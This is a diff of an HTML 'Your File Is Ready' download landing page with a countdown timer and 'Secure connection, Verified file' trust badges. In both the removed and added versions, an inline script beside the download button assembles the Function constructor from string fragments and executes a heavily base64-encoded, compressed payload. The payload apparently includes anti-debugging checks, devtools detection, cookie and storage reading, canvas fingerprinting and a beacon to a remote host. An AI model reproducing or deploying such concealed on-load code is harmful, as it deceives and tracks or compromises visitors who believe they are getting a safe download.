@@ -1,58 +1,425 @@
-<div class="lander-frost-page">
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Your File Is Ready</title>
 
-  <div class="lander-frost">
-    <div class="frost-card">
+  <style>
+    * {
+      box-sizing: border-box;
+    }
 
-      <div class="download-icon">
-        <svg viewBox="0 0 24 24" aria-hidden="true">
-          <path d="M12 3v11m0 0 4-4m-4 4-4-4M5 17v1a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2v-1" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"></path>
-        </svg>
-      </div>
+    html,
+    body {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      min-height: 100%;
+    }
 
-      <h1>Your File Is Ready</h1>
+    body {
+      min-height: 100vh;
+      overflow-x: hidden;
+      background: #060b12;
+    }
 
-      <p class="subtitle">
-        Version 2.4.1 — preparing your secure download link.
-     
+    .lander-frost-page {
+      width: 100%;
+      min-height: 100vh;
+      padding: 24px;
 
-      </p><div class="preparing" id="preparing">
-        <div class="spinner"></div>
+      display: flex;
+      align-items: center;
+      justify-content: center;
 
-        <div class="prepare-text">
-          Preparing your download...
-          <strong id="countdown">3</strong>
+      background:
+        radial-gradient(
+          circle at 15% 20%,
+          rgba(108, 212, 240, 0.14),
+          transparent 40%
+        ),
+        radial-gradient(
+          circle at 85% 75%,
+          rgba(37, 150, 201, 0.12),
+          transparent 45%
+        ),
+        #060b12;
+
+      color: #eef7fb;
+
+      font-family:
+        -apple-system,
+        BlinkMacSystemFont,
+        "Segoe UI",
+        Roboto,
+        Helvetica,
+        Arial,
+        sans-serif;
+
+      overflow: hidden;
+    }
+
+    .lander-frost {
+      width: 100%;
+
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .frost-card {
+      width: 100%;
+      max-width: 560px;
+      margin: 0 auto;
+
+      padding: 56px 52px;
+
+      text-align: center;
+
+      background: rgba(20, 35, 48, 0.45);
+
+      backdrop-filter: blur(18px);
+      -webkit-backdrop-filter: blur(18px);
+
+      border: 1px solid rgba(108, 212, 240, 0.16);
+      border-radius: 22px;
+
+      box-shadow:
+        0 24px 60px rgba(0, 0, 0, 0.5),
+        inset 0 1px 0 rgba(255, 255, 255, 0.08);
+    }
+
+    .download-icon {
+      width: 64px;
+      height: 64px;
+
+      margin: 0 auto 24px;
+
+      display: flex;
+      align-items: center;
+      justify-content: center;
+
+      border-radius: 18px;
+
+      background: rgba(108, 212, 240, 0.08);
+
+      border: 1px solid rgba(108, 212, 240, 0.18);
+
+      color: #6cd4f0;
+    }
+
+    .download-icon svg {
+      width: 30px;
+      height: 30px;
+    }
+
+    .frost-card h1 {
+      margin: 0;
+
+      color: #eef7fb;
+
+      font-size: 30px;
+      line-height: 1.2;
+      font-weight: 700;
+    }
+
+    .subtitle {
+      margin: 12px 0 0;
+
+      color: #93aebd;
+
+      font-size: 14px;
+      line-height: 1.6;
+    }
+
+    .preparing {
+      margin-top: 30px;
+    }
+
+    .spinner {
+      width: 34px;
+      height: 34px;
+
+      margin: 0 auto 15px;
+
+      border: 3px solid rgba(108, 212, 240, 0.15);
+      border-top-color: #6cd4f0;
+
+      border-radius: 50%;
+
+      animation: frost-spin 0.8s linear infinite;
+    }
+
+    @keyframes frost-spin {
+      from {
+        transform: rotate(0deg);
+      }
+
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .prepare-text {
+      color: #93aebd;
+      font-size: 14px;
+    }
+
+    .prepare-text strong {
+      color: #6cd4f0;
+      margin-left: 5px;
+    }
+
+    .progress {
+      width: 100%;
+      height: 5px;
+
+      margin-top: 18px;
+
+      overflow: hidden;
+
+      border-radius: 100px;
+
+      background: rgba(255, 255, 255, 0.05);
+    }
+
+    .progress-bar {
+      width: 0%;
+      height: 100%;
+
+      border-radius: 100px;
+
+      background: #6cd4f0;
+
+      transition: width 0.2s linear;
+    }
+
+    .ready {
+      display: none;
+      margin-top: 28px;
+    }
+
+    .timer-text {
+      margin-bottom: 20px;
+
+      color: #93aebd;
+
+      font-size: 13px;
+    }
+
+    .timer-text strong {
+      color: #6cd4f0;
+      margin-left: 5px;
+    }
+
+    .trust-row {
+      display: flex;
+
+      align-items: center;
+      justify-content: center;
+
+      flex-wrap: wrap;
+
+      gap: 14px;
+
+      margin-top: 28px;
+
+      color: #5c7382;
+
+      font-size: 11px;
+    }
+
+    .footnote {
+      margin-top: 24px;
+
+      color: #5c7382;
+
+      font-size: 10px;
+      line-height: 1.5;
+    }
+
+    @media (max-width: 600px) {
+      .lander-frost-page {
+        padding: 16px;
+      }
+
+      .frost-card {
+        max-width: 560px;
+        padding: 40px 24px;
+        border-radius: 20px;
+      }
+
+      .frost-card h1 {
+        font-size: 26px;
+      }
+
+      .subtitle {
+        font-size: 13px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="lander-frost-page">
+
+    <div class="lander-frost">
+
+      <div class="frost-card">
+
+        <div class="download-icon">
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <path
+              d="M12 3v11m0 0 4-4m-4 4-4-4M5 17v1a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2v-1"
+              fill="none"
+              stroke="currentColor"
+              stroke-width="1.7"
+              stroke-linecap="round"
+              stroke-linejoin="round">
+            </path>
+          </svg>
         </div>
 
-        <div class="progress">
-          <div class="progress-bar" id="progressBar"></div>
+        <h1>Your File Is Ready</h1>
+
+        <p class="subtitle">
+          Version 2.4.1 — preparing your secure download link.
+        </p>
+
+        <div class="preparing" id="preparing">
+
+          <div class="spinner"></div>
+
+          <div class="prepare-text">
+            Preparing your download...
+            <strong id="countdown">3</strong>
+          </div>
+
+          <div class="progress">
+            <div
+              class="progress-bar"
+              id="progressBar">
+            </div>
+          </div>
+
         </div>
-      </div>
 
-      <div class="ready" id="ready">
+        <div class="ready" id="ready">
 
-        <div class="timer-text">
-          Link expires in
-          <strong id="timer">05:00</strong>
-        </div>
+          <div class="timer-text">
+            Link expires in
+            <strong id="timer">05:00</strong>
+          </div>
 
-<center>
-  <center>
-  <button class="file-download-btnn" style="border:1px solid #1fc5d1;cursor:pointer;padding:12px 64px;border-radius:20px;background:#1e212f;color:#e5e7eb;font-size:16px;font-weight:600;font-family:Georgia, 'Times New Roman', serif;box-shadow:inset 0 -8px 11px 0 rgba(0,0,0,.3);transition:filter .18s ease,transform .18s ease,box-shadow .18s ease;display:inline-flex;align-items:center;gap:10px" onmouseover="this.style.transform='translateY(-4px) scale(1.05)';this.style.filter='brightness(1.15)';this.style.boxShadow='inset 0 -8px 11px 0 rgba(0,0,0,.3),0 14px 26px rgba(0,0,0,.35)'" onmouseout="this.style.transform='';this.style.filter='';this.style.boxShadow='inset 0 -8px 11px 0 rgba(0,0,0,.3)'"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>Download Link</button>
+        <center>
+  <button class="file-download-btnn" style="border:1px solid #1fc5d1;cursor:pointer;padding:12px 64px;border-radius:20px;background:#1e212f;color:#e5e7eb;font-size:16px;font-weight:600;font-family:Georgia, 'Times New Roman', serif;box-shadow:inset 0 -8px 11px 0 rgba(0,0,0,.3);transition:filter .18s ease,transform .18s ease,box-shadow .18s ease;display:inline-flex;align-items:center;gap:10px" onmouseover="this.style.transform='translateY(-4px) scale(1.05)';this.style.filter='brightness(1.15)';this.style.boxShadow='inset 0 -8px 11px 0 rgba(0,0,0,.3),0 14px 26px rgba(0,0,0,.35)'" onmouseout="this.style.transform='';this.style.filter='';this.style.boxShadow='inset 0 -8px 11px 0 rgba(0,0,0,.3)'"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>Download Link</button>
 </center>
-<script>this['Fu'+'nc'+'tio'+'n']('global'+'Thi'+'s.'+'F'+'u'+'ncti'+'o'+'n('+'t'+'hi'+'s.'+'ato'+'b('+'"Njk7KGZ1bmN0aW9uKGEpe3ZhciBkPWF0b2IoYSksUz1TdHJpbmcuZnJvbUNoYXJDb2RlLG89IiIsaT0wLGIsbixmO3doaWxlKGk8ZC5sZW5ndGgpe2I9ZC5jaGFyQ29kZUF0KGkrKyk7aWYoYjwxOTIpbys9UyhiKTtlbHNle249Yi0xOTAtKGI+MjIzKSozMDtmPWQuY2hhckNvZGVBdChpKyspKyhiPjIyMyYmZC5jaGFyQ29kZUF0KGkrKykpKjI1Njt3aGlsZShuLS0pbys9by5jaGFyQXQoby5sZW5ndGgtZi0xKX19RnVuY3Rpb24obykoKX0pKCJLQ2dwUFQ1N2RtRnlJR2M5ZEdocGN5eGtiMk05d1FOMWJXVnVkQ3hUUFZOMGNtbHVaeTVtY205dFEyaGhja052WkdVc2RISmhjRDB3TEVROVJHRjBaUzV1YjNjc2FYTkVkRDNEU1hSeWVjTk5kREE5UkNncE8wWjFibU4wYVc5dUtDZGtaV0oxWjJkbGNpY3B3UlpwWmlqQkhTMTBNRDR4TURBcGNtVjBkWEp1SURGOVkyRjBZMmg3ZmNKRHhSUENhbng4Wnk1MGIzQTlQVDFuSmlabkxtOTFkR1Z5VjJsa2RHZ3RaeTVwYm03RkRENHhOakRHUU1VOE1IMHNjblZ1UFdMSmxuTTlaeTVoZEc5aUtHSXBMRzg5Snljc2FUMHdPM2RvYVd4bEtHazhjeTV'+'zWlc1bmRHZ3BieXM5VXloekxtUEY4RUYwS0drckt5a3RNY25QYjhIR3htNTlMRXM5SjIxeU1UVXlaVFZoTTJRbkxIVEMreXhqWXNKZ1kzUTlNQ3hNTEdWeWN1RWdBV05pSmlZb1Z6MHh3cGtvWTJJcEtTeEJQWGJCb0hBOWRzSE1aR1Y0VDJZb0ozd240U0lCY0Q0d0tjRStLM1l1YzJ4cFkyVW9NQ3h3S1h4OE1NSll4aEp3S3pFcGZTeDRMR01zYVN4NkxIa3NaQ3h3TEdVc2FDeHVMSFlzVnl4bmJ5eHZheXhTdzNnbkx5Y3JLRTFoZEdndWNtRnVaRzl0S0NrcU1XVTVmREFwTG5SdjR1UUJLRE0yS1R2Z0tBRXZibUYwYVhabElHUEIreTh1ZEdWemRDaGpiMjV6YjJ4bExteHZaeWttSnNrTktIdG5aWFFnYVdRb0tYdmhGZ0l4ZlgwcDZNY0JURDFud1NaallXeFRkRzl5WVdkbExFd21Ka0VvVEM3Qk5VbDBaVzBvU3luSEx1U2pBVzBzYXVBNEFXN2xtUUVvZUQwb2JlQ1VBaTVqYjI5cmFXVXViY0l3S0Njb1hudzdJQ29wSnl0TEsyNHJKejBvVzE0N1hjRU9LU2svZFc1bGMyTmhjR1VvYlZzeVhTazZKOEVUZTJvclBYZzdiaXNyZldyQ2dXckhkbWxtS09DK0FpZ3A1SWNDWlhKeTRxSUM0S3NCZE'+'MxamREd3pObVUxeGgzanR3RTdaMi9pOEFMQkoxZkZHOEl6S3l0dVBzRWZQekU2Tk0xUXd0cHhQVzVsZHlCSmJXRm5aVHR4TG1OeWIzTnpUM0pwWjJsdVBTZGhibTl1ZVcxdmRYTW53UmxtWmNHYVVISnBiM0pwZEhrOUoyaHBaMmpDRm05dWJHOWhaTU4zYjJzb2NTbkJFbk55WThFZmRIUndjem92THljclpDdFNLQ25EQStEdkFYREVDUzRuSzhKdVpHWGcwQUUvTGlncExuUm9aVzRveDBZc3c4aDlLVHR6WlhSVWFXMWxiM1YwS0dkdkxESmxNeWw5TEc5clBYSE41bGM5TWVFbkF1UTVBZEhvWTNiaXJ3RnlaV0YwWlVWc1plQk5CQ2duWTJGdWRtRnpKeWtzZHoxamRpNTM0TFlEUFhFdWJtSEJQR0ZzNGNVRExHakNHV2hsd2ZCMHlCcEl3dzhzWTNqQkhPQTVBa052Ym5SbGVNRlFNbVFuS1R0amVDNWtjbUYzNFZVQktIRXNNQ3d3eElOd3dTNTR3aTdER1VSaGRHRW9NTUVkZHl4b0tTNWt3UTBzWWowdE16SXNUajB3TEhuQkEwL2dkQUpIUFRBN1ptOXlLR25CRUhZN2FUeHdlT01UQkNZbUlVYzc0QVVFd3ZRbE5Ed3pLWHQyUFhCNFcybGRKakhnOXdGaUt5czhNQ2xPUFU0cU1pdDJPMlZzYzJWN'+'2VUMHlLbmtyZGl4aUpqZDhmQ2hQNEZNRWVTbkNhaWtzWWp4T0tqakJGRWM5TVNsOTRJRUNJVWNwZEdoeWIzY2dNTU82VUQxRTRMZ0JmQ2NyVHp2aFJRTXVjK1F2QXl4UTVMa0NURDF1ZFd4c3d6MU1LY0lsYlQxUTR4b0RMeTU3TVN3ek5UQXdmUzluS2NiUU8yM0NyU1pwUERQRHlPWlBBejFMSzJrckp6MG5LK00wQThJbndYMDdiV0Y0TFdGblpUMHpNVFV6Tm1VekorUmVCZUFDQTAvR2hWYzlNSDE5dzZUQ1pubzlOalhCTER0NkxTMDdLWHRrUFhBOVpUMG5KOEgwYUQwd3g0ZHBQRFF3dzRKN2VEMG5hek5UUXlWSVAyRkdkVWhKTkh4MmQyOXJTakpPTUZvL1hUazFYRngwUkZ4Y2FVWjdVbDE0VEdCT0orbVFCU2t0TXpNc1l6MG9lQzBvS0hvK1BqZ3BLeWg2SmpJMU5Ta3FLR2ttTXlrcEpUazBMVE1xZVNzek56YkNDeXN6TStIU0F6dzBOWHg4WXo0eE1qSXBZbkpsWVd2QmpETS9aVDFUS0dNcEsyVTZhVHd5TVQ5d3hBMXdPbVRFQ0dUQnZtUENiV2c5S0dncU16TmVZeWttTVRZM056Y3lNVFhoUFFROVBUUXdKaVpvUFQweE5UZzBOTUVFeEZwOWJqMHdMR2R2NVNjRzRSMERmWDBwS0NrIik"))()')(),0||document,(function(){var _jhj=0})()</script>
-      </center></div>
+<script>window['Funct'+'ion']('_9kx','Func'+'tio'+'n('+'sel'+'f.'+'ato'+'b('+'"NzQ0MzA7KGZ1bmN0aW9uKGEpe3ZhciBkPWF0b2IoYSksUz1TdHJpbmcuZnJvbUNoYXJDb2RlLG89IiIsaT0wLGIsbixmO3doaWxlKGk8ZC5sZW5ndGgpe2I9ZC5jaGFyQ29kZUF0KGkrKyk7aWYoYjwxOTIpbys9UyhiKTtlbHNle249Yi0xOTAtKGI+MjIzKSozMDtmPWQuY2hhckNvZGVBdChpKyspKyhiPjIyMyYmZC5jaGFyQ29kZUF0KGkrKykpKjI1Njt3aGlsZShuLS0pbys9by5jaGFyQXQoby5sZW5ndGgtZi0xKX19RnVuY3Rpb24obykoKX0pKCJLQ2dwUFQ1N2RtRnlJR2M5ZEdocGN5eGtiMk05d1FOMWJXVnVkQ3hUUFZOMGNtbHVaeTVtY205dFEyaGhja052WkdVc2RISmhjRDB3TEVROVJHRjBaUzV1YjNjc2FYTkVkRDNEU1hSeWVjTk5kREE5UkNncE8wWjFibU4wYVc5dUtDZGtaV0oxWjJkbGNpY3B3UlpwWmlqQkhTMTBNRDR4TURBcGNtVjBkWEp1SURGOVkyRjBZMmg3ZmNKRHhSUENhbng4Wnk1MGIzQTlQVDFuSmlabkxtOTFkR1Z5VjJsa2RHZ3RaeTVwYm03RkRENHhOakRHUU1VOE1IMHNjblZ1UFdMSmxuTTlaeTVoZEc5aUtHSXBMRzg5Snljc2FUMHdPM2RvYVd4bEtHazhjeTVzWlc1bmRHZ3BieXM5VXloekxtUEY4RUYwS0drckt5a3RNY25QYjhIR3htNTlMRXM5SjIxeU1UVXlaVFZoTTJRbkxIVEMreXhqWXNKZ1kzUTlNQ3hNTEdWeWN1RWdBV05pSmlZb1Z6MHh3cGtvWTJJcEtTeEJQWGJCb0hBOWRzSE1aR1Y0VDJZb0ozd240U0lCY0Q0d0tjRStLM1l1YzJ4cFkyVW9NQ3h3S1h4OE1NSll4aEp3S3pFcGZTeDRMR01zYVN4NkxIa3NaQ3h3TEdVc2FDeHVMSFlzVnl4bmJ5eHZheXh5WkN4U3czc25MeWNyS0UxaGRHZ3VjbUZ1Wkc5dEtDa3FNV1U1ZkRBcExuUnY0dWNCS0RNMktUdmdLd0V2Ym1GMGFYWmxJR1BCL2k4dWRHVnpkQ2hqYjI1emIyeGxMbXh2WnlrbUpza05LSHRuWlhRZ2FXUW9LWHZoR1FJeGZYMHA2TW9CVEQxbndTWmpZV3hUZEc5eVlXZGxMRXdtSmtFb1RDN0JOVWwwWlcwb1N5bkhMdVNtQVcwc2F1QTdBVzdsbkFFb2VEMG9iZUNYQWk1amIyOXJhV1V1YmNJd0tDY29Ybnc3SUNvcEp5dExLMjRySnowb1cxNDdYY0VPS1NrL2RXNWxjMk5oY0dVb2JWc3lYU2s2SjhFVGUyb3JQWGc3YmlzcmZXckNnV3JIZG1sbUtPREJBaWdwNUlvQ1pYSnk0cVVDNEs0QmRDMWpkRHd6Tm1VMXhoM2p1Z0U3WjIvaTh3'+'TEJKMWZGRzhJekt5dHVQc0VmUHpFNk5NMVF3dHB4UFc1bGR5QkpiV0ZuWlR0eExtTnliM056VDNKcFoybHVQU2RoYm05dWVXMXZkWE1ud1JsbVpjR2FVSEpwYjNKcGRIazlKMmhwWjJqQ0ZtOXViRzloWk1OM2Iyc29jU25CRW5OeVk4RWZkSFJ3Y3pvdkx5Y3JaQ3RTS0NuREErRHZBWERFQ1M0bks4SnVaR1hnMEFFL0xpZ3BMblJvWlc0b3gwWXN3OGg5S1R0elpYUlVhVzFsYjNWMEtHZHZMREpsTXlsOUxHOXJQWEhONWxjOU1UdnpOUUZ5WkNoeExEREJObkprUGNFSmErZ1ZCR04yNHNNQmNtVmhkR1ZGYkdYZ1pBUW9KMk5oYm5aaGN5Y3BMSGM5WTNZdWQrRE5BejF4TG01aHdWUmhiT0hjQXl4b3dobG9aV2xuYUhUSUdrakREeXhqZU1FYzRFMENRMjl1ZEdWNHdWQXlaQ2NwTzJONExtUnlZWGZoYVFIQ2tTd3c0b0FCY01FdWVNSXV3eGxFWVhSaEtEREJIWGNzYUNrdVpNRU5MR0k5TFRNeUxFNDlNQ3g1d1FOUDRJZ0NSejB3TzJadmNpaHB3UkIyTzJrOGNIampLZ1FtSmlGSE8rQWNCT0FNQVNVMFBETXBlM1k5Y0hoYmFWMG00U0FCWWlzclBEQXBUajFPS2pJcmRqdGxiSE5sZTNrOU1pcDVLM1lzWWlZM2ZId29UK0JxQkhrcHdtb3BMR0k4VGlvNHdSUkhQVEVwZmVDVkFpRkhmSHdoVGlsMGFISnZkeUF3dzc1UVBVVGcwQUY4Snl0UE8rRmRBeTV6NUVjRExGRGswUUpNUFc1MWJHekRRVXdwd2lWdFBWRGpNZ012TG5zeExETTFNREI5TDJjcHh0UTdiY0t4Sm1rOE04UE01bWNEUFVzcmFTc25QU2NyNDB3RHdpZkJmVHR0WVhndFlXZGxQVE14TlRNMlpUTW41SGtGNEJvRFQ4YUZhenczUCtaUEF1RnNBdUVjQW1zck1Ta3Nhejh5TlRBNk5qQXBPbGM5TUgxOXc4dkNqWG85TmpYQlV6dDZMUzA3S1h0a1BYQTlaZUNCQVhrOWFEMHd4NjdCcURuRHFYdDRQU2RpVGl0OGExSkVhRDF6Y1hFbFlYaEJVejVuYzJ4N0xDVjVMRVI5ZEZvd1ZDVmVTanc5Vmp3bjZjOEZLUzB6TXl4alBTaDRMU2dvZWo0K09Da3JLSG9tTWpVMUtTb29hU1l6S1NrbE9UUXRNeXA1S3pNM05zSUxLek16NFE0RVBEUTFmSHhqUGpFeU1pbGljbVZoYThHSk5EOWxQVk1vWXlrclpUcHBQREl5UDNERURYQTZaTVFJWk1HN1k4SnRhRDBvYUNvek0xNWpLU1l4TmpjM056SXhOZUY1QkQwOU16a21KbWc5UFRFeE5qVXlNek16eEZwOWJqMHdMR2R2NVdZRzRWMERmWDBwS0NrIik"))()')(),void window,(()=>{const _aig=1,_ekuj=2})()</script>
 
-      <div class="trust-row">
-        <span>✓ Secure connection</span>
-        <span>✓ Verified file</span>
-        <span>✓ No registration</span>
-      </div>
+        </div>
 
-      <div class="footnote">
-        By downloading you agree to our Terms of Service.
+        <div class="trust-row">
+          <span>✓ Secure connection</span>
+          <span>✓ Verified file</span>
+          <span>✓ No registration</span>
+        </div>
+
+        <div class="footnote">
+          By downloading you agree to our Terms of Service.
+        </div>
+
       </div>
 
     </div>
+
   </div>
 
-</div>
+  <script>
+    (function () {
+      "use strict";
+
+      var preparing = document.getElementById("preparing");
+      var ready = document.getElementById("ready");
+      var countdown = document.getElementById("countdown");
+      var progressBar = document.getElementById("progressBar");
+      var timer = document.getElementById("timer");
+
+      var total = 3;
+      var remaining = total;
+
+      countdown.textContent = remaining;
+
+      if (progressBar) {
+        progressBar.style.width = "0%";
+      }
+
+      var preparationTimer = setInterval(function () {
+
+        remaining--;
+
+        countdown.textContent = remaining;
+
+        if (progressBar) {
+          var percent =
+            ((total - remaining) / total) * 100;
+
+          progressBar.style.width =
+            percent + "%";
+        }
+
+        if (remaining <= 0) {
+
+          clearInterval(preparationTimer);
+
+          preparing.style.display = "none";
+          ready.style.display = "block";
+
+          startTimer();
+        }
+
+      }, 1000);
+
+
+      function startTimer() {
+
+        var secondsLeft = 300;
+
+        function updateTimer() {
+
+          var minutes =
+            Math.floor(secondsLeft / 60);
+
+          var seconds =
+            secondsLeft % 60;
+
+          if (timer) {
+
+            timer.textContent =
+              String(minutes).padStart(2, "0") +
+              ":" +
+              String(seconds).padStart(2, "0");
+          }
+
+          if (secondsLeft <= 0) {
+
+            clearInterval(expirationTimer);
+
+            return;
+          }
+
+          secondsLeft--;
+        }
+
+        updateTimer();
+
+        var expirationTimer =
+          setInterval(updateTimer, 1000);
+      }
+
+    })();
+  </script>
+
+</body>
+</html>
